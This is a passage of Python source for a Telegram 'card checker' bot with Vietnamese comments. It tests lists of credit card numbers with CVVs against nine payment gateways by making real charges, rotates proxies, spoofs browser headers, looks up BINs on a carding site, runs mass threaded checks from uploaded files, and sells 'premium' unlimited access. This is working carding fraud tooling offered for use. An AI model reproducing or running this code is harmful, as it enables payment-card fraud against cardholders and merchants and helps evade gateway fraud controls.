    except ValueError:
        return 'invalid_format', line, "Năm hết hạn không hợp lệ.", {}
    if len(ano) == 2: ano = f"20{ano}"
    
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    
    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
        except IndexError:
            logger.warning("Danh sách proxy trống nhưng proxy đang được bật.")
            pass
            
    bin_info = {}
    try:
        bin_to_check = cc[:6]
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10, cancellation_event=cancellation_event)
        
        if error:
            return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi kiểm tra BIN: {error}", {}
        if bin_response:
            response_text_lower = bin_response.text.lower()
            if "not found" in response_text_lower and ('"detail":' in response_text_lower or bin_response.status_code != 200):
                return 'decline', line, 'INVALID_BIN_DECLINE', {}
            if bin_response.status_code == 200:
                try:
                    data = bin_response.json()
                    if isinstance(data, dict):
                        bin_info.update(data)
                    else:
                        logger.warning(f"API BIN trả về dữ liệu không phải dictionary cho BIN {bin_to_check}: {data}")
                except json.JSONDecodeError:
                    logger.warning(f"Lỗi phân tích JSON từ BIN check cho BIN {bin_to_check}")
                    
        country_name_str = bin_info.get('country_name') or ''
        if country_name_str.upper() == 'VIETNAM':
            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
            
        active_gate = get_active_gate()
        gate_functions = {
            '1': _check_card_gate1, '2': _check_card_gate2, '3': _check_card_gate3,
            '4': _check_card_gate4, '5': _check_card_gate5, '6': _check_card_gate6,
            '7': _check_card_gate7, '8': _check_card_gate8, '9': _check_card_gate9,
        }
        gate_func = gate_functions.get(active_gate, _check_card_gate1)

        # <<< THAY ĐỔI: Thêm logic retry cho Gate 9 >>>
        if active_gate == '9':
            max_retries_gate9 = 10
            for attempt in range(max_retries_gate9):
                if cancellation_event and cancellation_event.is_set():
                    return 'cancelled', line, 'User cancelled', {}

                # Gọi hàm check của Gate 9
                status, res_line, res_full, res_bin = gate_func(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount)
                
                # Nếu nhận được tín hiệu cần retry
                if status == 'retry_needed':
                    logger.warning(f"Gate 9: Thẻ {line} gặp lỗi, thử lại lần {attempt + 1}/{max_retries_gate9}...")
                    time.sleep(1.5) # Chờ một chút trước khi thử lại
                    continue # Quay lại vòng lặp để thử lại
                else:
                    # Nếu status là bất kỳ thứ gì khác, trả về kết quả ngay lập tức
                    return status, res_line, res_full, res_bin
            
            # Nếu đã chạy hết 10 lần retry mà vẫn không thành công
            logger.error(f"Gate 9: Thẻ {line} thất bại sau {max_retries_gate9} lần thử.")
            return 'gate9_persistent_error', line, f"Thất bại sau {max_retries_gate9} lần thử.", bin_info
        else:
            # Đối với các gate khác, giữ nguyên logic cũ
            return gate_func(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount)
            
    except Exception as e:
        logger.error(f"Lỗi không xác định trong check_card cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống không xác định: {e}", bin_info

def create_progress_bar(current, total, length=10):
    if total == 0: return "[??????????] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '?' * filled_len + '?' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
    except Exception:
        return ''

# --- LỆNH BOT ---
async def start(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id) or 'en'
    if user.id in load_users() or user.id == ADMIN_ID:
        if lang == 'vi':
            await update.message.reply_text(f"**Chào mừng trở lại, {user.first_name}!**\nDùng /help để xem các lệnh bạn có thể sử dụng.")
        else:
            await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
    else:
        welcome_message = (
            "**Welcome to the Premium Card Checker Bot!** ??\n\n"
            "This bot utilizes a powerful `Charge Api Auth` to provide accurate card checking services.\n\n"
            "**Your current status:** `GUEST`\n"
            f"Your Telegram ID: `{user.id}`\n\n"
            "**?? Upgrade to Premium! ??**\n"
            "Unlock the full potential of the bot with a Premium membership:\n"
            "? **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
            "? **Priority Support:** Get faster assistance from the admin.\n\n"
            f"To get access and upgrade to Premium, please contact the admin with your ID: {ADMIN_USERNAME}"
        )
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"?? ID Telegram của bạn là: `{update.effective_user.id}`")

async def get_help_text(user: User, lang_code: str):
    user_id = user.id
    user_mass_limit = get_user_limit(user_id)
    user_multi_limit = get_user_multi_limit(user_id)
    active_gate = get_active_gate()
    active_gate_name = get_formatted_gate_name(active_gate)
    gate_status_line_vi = f"\n?? **Cổng check thẻ hiện tại:** `{active_gate_name}`"
    gate_status_line_en = f"\n?? **Current Card Check Gate:** `{active_gate_name}`"
    new_commands_vi = (
        "\n**Kiểm tra Website:**\n"
        "?? `/site <website.com>`\n"
        "   - *Mô tả:* Kiểm tra thông tin một website (Gateway, Captcha, etc.).\n\n"
        "?? `/sitem`\n"
        "   - *Mô tả:* Kiểm tra nhiều website cùng lúc (tối đa 10).\n"
    )
    new_commands_en = (
        "\n**Website Checker:**\n"
        "?? `/site <website.com>`\n"
        "   - *Description:* Checks a single website's info (Gateway, Captcha, etc.).\n\n"
        "?? `/sitem`\n"
        "   - *Description:* Checks multiple websites at once (max 10).\n"
    )
    text_vi = {
        "public": (
            "**Bảng Lệnh Công Khai** ???\n"
            "Chào mừng bạn! Dưới đây là các lệnh cơ bản bạn có thể sử dụng:\n\n"
            "?? `/start`\n"
            "   - *Mô tả:* Khởi động bot và nhận ID Telegram của bạn.\n\n"
            "?? `/info`\n"
            "   - *Mô tả:* Lấy lại ID Telegram của bạn một cách nhanh chóng.\n\n"
            "?? `/help`\n"
            "   - *Mô tả:* Hiển thị bảng trợ giúp này.\n\n"
            f"**Nâng cấp Premium:**\nĐể sử dụng các tính năng check không giới hạn, vui lòng liên hệ Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Bảng Lệnh Thành Viên** ??\n"
            "Bạn đã được cấp quyền! Sử dụng các lệnh sau:\n\n"
            "**Kiểm tra Thẻ:**\n"
            "?? `/cs <thẻ>`\n"
            "   - *Mô tả:* Kiểm tra một thẻ tín dụng duy nhất.\n\n"
            "?? `/bin <bin>`\n"
            "   - *Mô tả:* Lấy thông tin của một đầu số thẻ (BIN).\n\n"
            "?? `/multi`\n"
            f"   - *Mô tả:* Kiểm tra nhiều thẻ trong một tin nhắn (tối đa {user_multi_limit} thẻ).\n\n"
            "?? `/mass<số luồng>`\n"
            "   - *Mô tả:* Kiểm tra hàng loạt thẻ từ một tệp `.txt`.\n\n"
            "?? `/stop`\n"
            "   - *Mô tả:* Dừng tác vụ `/mass` hoặc `/multi` đang chạy của bạn.\n"
            f"{new_commands_vi}\n"
            f"?? **Hạn mức /mass:** `{user_mass_limit}` lines/file.\n"
            f"?? **Nâng cấp Premium:** Liên hệ {ADMIN_USERNAME} để check không giới hạn."
        )
    }
    text_en = {
        "public": (
            "**Public Command Menu** ???\n"
            "Welcome! Here are the basic commands you can use:\n\n"
            "?? `/start`\n"
            "   - *Description:* Starts the bot and gets your Telegram ID.\n\n"
            "?? `/info`\n"
            "   - *Description:* Quickly retrieves your Telegram ID again.\n\n"
            "?? `/help`\n"
            "   - *Description:* Displays this help menu.\n\n"
            f"**Upgrade to Premium:**\nTo use unlimited checking features, please contact the Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Member Command Menu** ??\n"
            "You are authorized! Use these commands:\n\n"
            "**Card Checker:**\n"
            "?? `/cs <card>`\n"
            "   - *Description:* Checks a single credit card.\n\n"
            "?? `/bin <bin>`\n"
            "   - *Description:* Retrieves information for a card's BIN.\n\n"
            "?? `/multi`\n"
            f"   - *Description:* Checks multiple cards in one message (max {user_multi_limit} cards).\n\n"
            "?? `/mass<threads>`\n"
            "   - *Description:* Checks a list of cards from a `.txt` file.\n\n"
            "?? `/stop`\n"
            "   - *Description:* Stops your currently running /mass or /multi task.\n"
            f"{new_commands_en}\n"
            f"?? **/mass Limit:** `{user_mass_limit}` lines/file.\n"
            f"?? **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
        )
    }
    admin_commands = (
        "**Bảng Lệnh Quản Trị Viên** ??\n"
        "Toàn quyền quản lý bot với các lệnh sau:\n\n"
        "**Quản lý Bot & Check:**\n"
        "?? `/on`, `/off` - Bật/Tắt bot.\n"
        "?? `/status` - Kiểm tra trạng thái các cổng check.\n"
        "?? `/gate [1-9]` - Đổi cổng check.\n"
        "?? `/setgate <id> <min> <max>` - Đặt khoảng charge cho cổng.\n"
        "?? `/stop <user_id>` - Dừng task của user.\n"
        "?? `/cs<amount> <card>` - Check với số tiền charge tùy chỉnh.\n\n"
        "**Quản lý Proxy:**\n"
        "?? `/onprx`, `/offprx` - Bật/Tắt sử dụng proxy.\n"
        "?? `/addprx <proxy>` - Thêm và kiểm tra proxy mới.\n"
        "?? `/deleteprx` - Xem và xóa proxy hiện có.\n"
        "?? `/testprx` - Kiểm tra các proxy đã lưu.\n\n"
        "**Quản lý User & Tin nhắn:**\n"
        "?? `/add <user_id>`\n"
        "?? `/ban <user_id>`\n"
        "?? `/show` - Xem danh sách user.\n"
        "?? `/send <user_id> <tin_nhắn>`\n"
        "?? `/sendall <tin_nhắn>`\n\n"
        "**Quản lý Giới hạn:**\n"
        "?? `/addlimit <user_id> <số>`\n"
        "?? `/addlimitmulti <user_id> <số>`\n\n"
        "**Giám sát & Lịch sử:**\n"
        "?? `/active` - Xem các tác vụ đang chạy.\n"
        "?? `/showcheck` - Xem thống kê check.\n"
        "?? `/lootfile <user_id>` - Lấy lại file kết quả."
    )
    lang_texts = text_vi if lang_code == 'vi' else text_en
    gate_status_line = gate_status_line_vi if lang_code == 'vi' else gate_status_line_en
    if user_id == ADMIN_ID:
        return f"{admin_commands}{gate_status_line_vi}\n\n{text_vi['member'].split('?? **Hạn mức /mass:**')[0].strip()}"
    elif user_id in load_users():
        return f"{lang_texts['member']}{gate_status_line}"
    else:
        return lang_texts['public']

async def help_command(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id)
    if not lang:
        keyboard = [
            [
                InlineKeyboardButton("???? Tiếng Việt", callback_data="setlang_vi"),
                InlineKeyboardButton("???? English", callback_data="setlang_en"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Vui lòng chọn ngôn ngữ của bạn / Please select your language:",
            reply_markup=reply_markup
        )
    else:
        help_text = await get_help_text(user, lang)
        await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Cú pháp: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0])
        users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"?? Người dùng `{user_to_add}` đã có trong danh sách.")
        else:
            users.add(user_to_add)
            save_users(users)
            await update.message.reply_text(f"? Đã thêm người dùng `{user_to_add}`.")
    except ValueError: await update.message.reply_text("? User ID không hợp lệ.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Cú pháp: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0])
        users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban)
            save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"?? Đã xóa người dùng `{user_to_ban}` và toàn bộ log.")
        else:
            await update.message.reply_text(f"?? Không tìm thấy người dùng `{user_to_ban}`.")
    except ValueError: await update.message.reply_text("? User ID không hợp lệ.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("?? Danh sách người dùng trống."); return
    message_lines = ["?? **Danh sách ID & Hạn mức:**\n"]
    for user_id in sorted(list(users)):
        limit_mass = get_user_limit(user_id)
        limit_multi = get_user_multi_limit(user_id)
        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Cú pháp: `/addlimit <user_id> <số_dòng_thêm>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("? Dữ liệu không hợp lệ. Hãy chắc chắn ID và số lượng là số."); return
    limits = load_json_file(LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    await update.message.reply_text(f"? **Cập nhật giới hạn /mass thành công!**\n\n"
                                      f"?? **User ID:** `{target_user_id_str}`\n"
                                      f"?? **Giới hạn cũ:** `{old_limit}`\n"
                                      f"? **Đã thêm:** `{amount_to_add}`\n"
                                      f"?? **Tổng mới:** `{new_limit}`")

async def add_multi_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Cú pháp: `/addlimitmulti <user_id> <số_thẻ_thêm>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("? Dữ liệu không hợp lệ. Hãy chắc chắn ID và số lượng là số."); return
    limits = load_json_file(MULTI_LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(MULTI_LIMIT_FILE, limits)
    await update.message.reply_text(f"? **Cập nhật giới hạn /multi thành công!**\n\n"
                                      f"?? **User ID:** `{target_user_id_str}`\n"
                                      f"?? **Giới hạn cũ:** `{old_limit}`\n"
                                      f"? **Đã thêm:** `{amount_to_add}`\n"
                                      f"?? **Tổng mới:** `{new_limit}`")

async def bin_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
        return
    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
        await update.message.reply_text("Vui lòng cung cấp một BIN hợp lệ (6-8 chữ số).\nSử dụng: `/bin <bin_number>`")
        return
    bin_to_check = context.args[0]
    msg = await update.message.reply_text(f"? Đang kiểm tra BIN `{bin_to_check}`...")
    try:
        session = requests.Session()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        session.headers.update({"User-Agent": ua})
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)
        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text.lower():
            await msg.edit_text(f"? Không tìm thấy thông tin cho BIN `{bin_to_check}`."); return
        bin_info = bin_response.json()
        brand = (bin_info.get('brand') or 'N/A').upper()
        card_type = (bin_info.get('type') or 'N/A').upper()
        level = (bin_info.get('level') or 'N/A').upper()
        bank = bin_info.get('bank') or 'None'
        country_name = (bin_info.get('country_name') or 'N/A').upper()
        country_code = bin_info.get('country_code')
        flag = get_flag_emoji(country_code)
        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
        bin_info_line = " – ".join(bin_info_parts)
        response_text = (
            f"?? **BIN:** {bin_info_line}\n"
            f"??? **Bank:** {bank}\n"
            f"?? **Country:** {country_name} {flag}"
        )
        final_message = f"?? **BIN Info:** `{bin_to_check}`\n\n{response_text}"
        await msg.edit_text(final_message)
    except json.JSONDecodeError:
        await msg.edit_text(f"? Lỗi khi phân tích dữ liệu từ API cho BIN `{bin_to_check}`.")
    except Exception as e:
        logger.error(f"Lỗi trong /bin: {e}", exc_info=True)
        await msg.edit_text(f"?? **Lỗi Hệ Thống:** `{e}`")

async def _process_single_check(update, context, line, custom_charge_amount=None):
    msg = await update.message.reply_text("? *Checking your card, please wait...*")
    start_time = time.time()
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(
            check_card, line, custom_charge_amount=custom_charge_amount
        )
        duration = time.time() - start_time
        active_gate = get_active_gate()
        gate_name = get_formatted_gate_name(active_gate)
        if custom_charge_amount is not None:
            amount_in_usd = custom_charge_amount / 100.0
            gate_name = f"Custom Charge {amount_in_usd:.2f}$ (Gate {active_gate})"
        
        if status == 'gate_dead':
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                 f"**?? Card:** `{original_line}`\n"
                                 f"**?? Status: ? GATE DIED**\n"
                                 f"**?? Response:** `The payment gateway is currently down (Forbidden). Please contact the admin.`\n\n"
                                 f"**?? Gateway:** `{gate_name}`\n"
                                 f"**?? Took:** `{duration:.2f}s`\n\n"
                                 f"?? *Checker by: {ADMIN_USERNAME}*")
            await msg.edit_text(final_message)
            return
            
        is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'
        is_invalid_bin_decline = status == 'decline' and full_response == 'INVALID_BIN_DECLINE'
        is_expired_card_decline = status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE'
        is_invalid_cardnumber_decline = status == 'decline' and full_response == 'INVALID_CARDNUMBER_DECLINE'

        if is_invalid_bin_decline:
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                 f"**?? Card:** `{original_line}`\n"
                                 f"**?? Status: ? DECLINED**\n"
                                 f"**?? Response:** `Invalid Card Number (BIN not found)`\n\n"
                                 f"**?? Gateway:** `BIN Check`\n\n"
                                 f"**?? Took:** `{duration:.2f}s`\n\n"
                                 f"?? *Checker by: {ADMIN_USERNAME}*")
        elif is_invalid_cardnumber_decline:
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                 f"**?? Card:** `{original_line}`\n"
                                 f"**?? Status: ? DECLINED**\n"
                                 f"**?? Response:** `Invalid Card Number`\n\n"
                                 f"**?? Gateway:** `Datatrans Tokenize`\n\n"
                                 f"**?? Took:** `{duration:.2f}s`\n\n"
                                 f"?? *Checker by: {ADMIN_USERNAME}*")
        elif is_expired_card_decline:
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                 f"**?? Card:** `{original_line}`\n"
                                 f"**?? Status: ? DECLINED**\n"
                                 f"**?? Response:** `Card Expired`\n\n"
                                 f"**?? Gateway:** `Pre-Check`\n\n"
                                 f"**?? Took:** `{duration:.2f}s`\n\n"
                                 f"?? *Checker by: {ADMIN_USERNAME}*")
        elif is_vn_decline:
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                 f"**?? Card:** `{original_line}`\n"
                                 f"**?? Status: ? DECLINED**\n"
                                 f"**?? Response:** `DECLINED (Vietnam BIN)`\n\n"
                                 f"**?? Gateway:** `{gate_name}`\n\n"
                                 f"**?? Took:** `{duration:.2f}s`\n\n"
                                 f"?? *Checker by: {ADMIN_USERNAME}*")
        else:
            status_text = ""
            response_message = ""
            status_map = {
                'custom': ("?? 3D SECURE", full_response), 'invalid_format': ("?? FORMAT ERROR", full_response),
                'error': ("?? ERROR", full_response), 'unknown': ("? UNKNOWN", full_response),
                'gate9_persistent_error': ("?? GATE 9 ERROR", full_response),
            }
            if status == 'live_success':
                status_text = "? Approved"
                response_message = "Card Added Successfully ??"
            elif status == 'decline':
                status_text = "? DECLINED"
                response_message = "Card Declined"
            elif status == 'success':
                try:
                    amount_charged_raw = int(full_response.split('_')[1])
                    amount_in_usd = amount_charged_raw / 100.0
                    status_text = f"? CHARGED {amount_in_usd:.2f}$"
                    response_message = f"Transaction successful for {amount_in_usd:.2f}$."
                except (ValueError, IndexError):
                    status_text = "? CHARGED"
                    response_message = "Transaction successful!"
            else:
                status_text, response_message = status_map.get(status, status_map['unknown'])
                
            brand = (bin_info.get('brand') or 'N/A').upper()
            card_type = (bin_info.get('type') or 'N/A').upper()
            level = (bin_info.get('level') or 'N/A').upper()
            bank = bin_info.get('bank') or 'None'
            country_name = (bin_info.get('country_name') or 'N/A').upper()
            country_code = bin_info.get('country_code')
            flag = get_flag_emoji(country_code)
            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
            bin_info_line = " – ".join(bin_info_parts)
            
            bin_details_str = (
                f"?? **BIN:** {bin_info_line}\n"
                f"??? **Bank:** {bank}\n"
                f"?? **Country:** {country_name} {flag}"
            )

            response_display_part = ""
            if status in ['custom', 'invalid_format', 'error', 'unknown', 'gate9_persistent_error']:
                safe_response = str(response_message)[:1000]
                response_display_part = f"**?? Response:**\n```json\n{safe_response}\n```"
            else:
                response_display_part = f"**?? Response:** `{response_message}`"

            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                 f"**?? Card:** `{original_line}`\n"
                                 f"**?? Status: {status_text}**\n"
                                 f"{response_display_part}\n\n"
                                 f"?? **BIN Info:**\n{bin_details_str}\n\n"
                                 f"**?? Gateway:** `{gate_name}`\n\n"
                                 f"**?? Took:** `{duration:.2f}s`\n\n"
                                 f"?? *Checker by: {ADMIN_USERNAME}*")
        await msg.edit_text(final_message)
    except Exception as e:
        logger.error(f"Lỗi trong hàm _process_single_check: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await msg.edit_text(f"?? **System Error:**\n```\n{safe_error_message}\n```")

async def cs_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    if not context.args: await update.message.reply_text("Sử dụng: `/cs cc|mm|yy|cvv` hoặc `/cs cc|mm/yy|cvv`"); return
    line = " ".join(context.args)
    await _process_single_check(update, context, line)

async def cs_custom_amount_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID:
        return
    if not is_bot_on():
        await update.message.reply_text(MESSAGES_VI["bot_off"])
        return
    match = re.match(r'/cs(\d+)', update.message.text, re.IGNORECASE)
    if not match: return
    try:
        custom_charge_amount = int(match.group(1))
    except (ValueError, IndexError):
        await update.message.reply_text("? Số tiền charge không hợp lệ.")
        return
    card_info_str = update.message.text[len(match.group(0)):].strip()
    if not card_info_str:
        await update.message.reply_text(f"Sử dụng: `/cs{custom_charge_amount} cc|mm|yy|cvv`")
        return
    await _process_single_check(update, context, card_info_str, custom_charge_amount=custom_charge_amount)


async def multi_check_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    if user.id in ACTIVE_CHECKS:
        await update.message.reply_text("Bạn đang có một tác vụ check khác đang chạy. Vui lòng chờ nó hoàn thành hoặc dùng /stop.", quote=True)
        return
    text_content = update.message.text.split('/multi', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("Sử dụng: `/multi` và dán danh sách thẻ của bạn ở dòng dưới."); return
    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
    total_lines = len(lines)
    if total_lines == 0:
        await update.message.reply_text("Không có thẻ nào để check."); return
    if user.id != ADMIN_ID:
        user_limit = get_user_multi_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"?? **Vượt quá giới hạn!**\n\n"
                f"Bạn đã gửi `{total_lines}` thẻ, nhưng giới hạn cho lệnh /multi là `{user_limit}` thẻ mỗi lần.\n\n"
                f"Để tăng hạn mức, vui lòng liên hệ admin {ADMIN_USERNAME}."
            )
            return
    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)
    keyboard = [[InlineKeyboardButton("?? Dừng Task Của Tôi", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    status_message = await update.message.reply_text(f"? Đang khởi tạo... Chuẩn bị check `{total_lines}` thẻ qua **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    cancel_event = threading.Event()
    try:
        ACTIVE_CHECKS[user.id] = { "full_name": user.full_name, "username": user.username, "start_time": time.time(), "task_type": "multi" }
        CANCELLATION_EVENTS[user.id] = cancel_event
        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0, 'gate9_persistent_error': 0}
        results = {k: [] for k in counts.keys()}
        processed_count = 0
        last_update_time = time.time()
        num_threads = min(10, total_lines)
        
        gate_died_flag = False
        gate_fail_card = ""
        gate9_abort_flag = False

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break
                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    
                    # <<< THAY ĐỔI: Xử lý dừng tool cho Gate 9 >>>
                    if status == 'gate9_persistent_error':
                        counts['gate9_persistent_error'] += 1
                        results['error'].append(f"?? `{original_line}` | Lỗi Dai Dẳng Gate 9")
                        if counts['gate9_persistent_error'] > 10:
                            logger.error(f"GATE 9 ABORT: User {user.id} đã vượt quá 10 lỗi dai dẳng. Dừng tác vụ.")
                            gate9_abort_flag = True
                            gate_fail_card = original_line
                            cancel_event.set() # Dừng các thread khác
                    elif status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        continue
                        
                    counts[status] = counts.get(status, 0) + 1
                    status_icons = {'success': '?', 'live_success': '?', 'decline': '?', 'custom': '??', 'invalid_format': '??', 'error': '??', 'unknown': '?', 'cancelled': '??'}
                    result_line = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (VN BIN)`"
                        elif full_response == 'INVALID_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid BIN)`"
                        elif full_response == 'EXPIRED_CARD_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Expired)`"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid Card Number)`"
                        else: result_line = f"{status_icons['decline']} `{original_line}`"
                    elif status == 'live_success':
                        bin_str = f"{(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        result_line = f"{status_icons['live_success']} `{original_line}` | Approved | `{bin_str}`"
                    elif status == 'invalid_format': result_line = f"{status_icons[status]} `{original_line}` | Lỗi do: {str(full_response)[:50]}"
                    elif status == 'cancelled': continue
                    elif status == 'gate9_persistent_error': continue
                    else:
                        bin_str = f"{(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        result_line = f"{status_icons.get(status, '?')} `{original_line}` | `{bin_str}`"
                    if result_line: results[status].append(result_line)

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Lỗi khi xử lý future cho thẻ {original_line}: {e}", exc_info=True)
                    counts['error'] += 1
                    results['error'].append(f"?? `{original_line}` | Lỗi xử lý: {e}")
                
                # <<< THAY ĐỔI: Dừng vòng lặp nếu có tín hiệu abort từ Gate 9 >>>
                if gate9_abort_flag:
                    break

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    status_lines = [
                        f"**?? Checking in progress...**\n{progress_bar}\n",
                        f"?? **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    if active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge'):
                        status_lines.append(f"? **Charged:** `{counts['success']}`")
                    status_lines.extend([
                        f"? **Approved:** `{counts['live_success']}`",
                        f"? **Declined:** `{counts['decline']}`",
                        f"?? **3D Secure:** `{counts['custom']}` | ? **Errors:** `{counts['error'] + counts['gate9_persistent_error']}`"
                    ])
